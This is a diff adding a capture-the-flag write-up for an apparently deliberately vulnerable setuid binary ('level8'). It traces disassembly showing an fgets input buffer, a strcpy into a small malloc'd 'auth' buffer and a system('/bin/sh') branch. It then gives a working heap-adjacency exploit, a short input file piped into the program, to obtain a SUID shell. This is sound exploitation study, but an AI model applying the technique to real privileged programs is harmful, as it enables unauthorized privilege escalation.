@@ -1,0 +1,81 @@
+The program reads on stdin into a buffer of 0x80 bytes on the stack:
+0x08048596      a1809a0408     eax = dword [sym.stdin]    ; obj.stdin ; [0x8049a80:4]=0
+0x0804859b      89442408       dword [nitems] = eax    ; FILE *stream
+0x0804859f      c74424048000.  dword [size] = 0x80     ; [0x80:4]=-1 ; 128 ; int size
+0x080485a7      8d442420       eax = [src]             ; 0x20 ; 32
+0x080485ab      890424         dword [esp] = eax       ; char *s
+0x080485ae      e88dfeffff     sym.imp.fgets ()        ;[3] ; char *fgets(char *s, int size, FILE *stream)
+The buffer is then compared against strings.
+
+This instruction block calls a shell for us:
+0x080486ec      7411           if (!var) goto 0x80486ff
+0x080486ee      c70424338804.  dword [esp] = str.bin_sh
+0x080486f5      e886fdffff     sym.imp.system ()
+0x080486fa      e975feffff     goto 0x8048574
+
+However this branch is only accessed when obj.auth[32] != 0:
+0x080486e2      a1ac9a0408     eax = dword [obj.auth]
+0x080486e7      8b4020         eax = dword [eax + 0x20]
+0x080486ea      85c0           var = eax & eax
+0x080486ec      7411           if (!var) goto 0x80486ff
+
+obj.auth is set here:
+0x08048628      7718           if (((unsigned) var) > 0) goto 0x8048642
+0x0804862a      8d442420       eax = [src]
+0x0804862e      8d5005         edx = [eax + 5]
+0x08048631      a1ac9a0408     eax = dword [obj.auth]
+0x08048636      89542404       dword [size] = edx
+0x0804863a      890424         dword [esp] = eax
+0x0804863d      e81efeffff     sym.imp.strcpy ()
+
+and malloc'd here:
+0x080485e2      755e           if (var) goto 0x8048642
+0x080485e4      c70424040000.  dword [esp] = 4
+0x080485eb      e880feffff     sym.imp.malloc ()
+0x080485f0      a3ac9a0408     dword [obj.auth] = eax
+0x080485f5      a1ac9a0408     eax = dword [obj.auth]
+0x080485fa      c70000000000   dword [eax] = 0
+
+This branch is reached when inputing a line beginning by "auth ":
+0x080485bb      8d442420       eax = [src]
+0x080485bf      89c2           edx = eax
+0x080485c1      b819880408     eax = str.auth            ; 0x8048819 ; "auth "
+0x080485c6      b905000000     ecx = 5
+0x080485cb      89d6           esi = edx
+0x080485cd      89c7           edi = eax
+0x080485cf      f3a6           repe cmpsb byte [esi],byte ptr es:[edi]
+0x080485d1      0f97c2         seta dl
+0x080485d4      0f92c0         setb al
+0x080485d7      89d1           ecx = edx
+0x080485d9      28c1           cl -= al
+0x080485db      89c8           eax = ecx
+0x080485dd      0fbec0         eax = al
+0x080485e0      85c0           var = eax & eax
+0x080485e2      755e           if (var) goto 0x8048642
+
+But the copy made by the strcpy only happens if the length of the string following "auth " is less then 30 (0x1e):
+0x08048600      8d442420       eax = [src]               ; 0x20 ; 32
+0x08048604      83c005         eax += 5
+0x08048607      c744241cffff.  dword [local_1ch] = 0xffffffff    ; [0xffffff
+0x0804860f      89c2           edx = eax
+0x08048611      b800000000     eax = 0
+0x08048616      8b4c241c       ecx = dword [local_1ch]    ; [0x1c:4]=-1 ; 28
+0x0804861a      89d7           edi = edx
+0x0804861c      f2ae           repne scasb al,byte es:[edi]
+0x0804861e      89c8           eax = ecx
+0x08048620      f7d0           eax = !eax
+0x08048622      83e801         eax -= 1
+0x08048625      83f81e         var = eax - 0x1e          ; 30
+0x08048628      7718           if (((unsigned) var) > 0) goto 0x8048642 ;[4]
+
+Since obj.auth and obj.service are allocated, we can rely on the fact that a second malloc of size <= 16 will likely be return right next to a first malloc of similar size.
+Which means that if we first send a "auth something\n" then "service something\n", &obj.auth[16] == obj_service; which means that obj_auth[32] is obj_service[16];
+So we just need to do:
+cat > file << EOF
+auth A
+serviceAAAAAAAAAAAAAAAA
+login
+EOF
+
+cat file - | ./level8
+and we got our SUID-shell
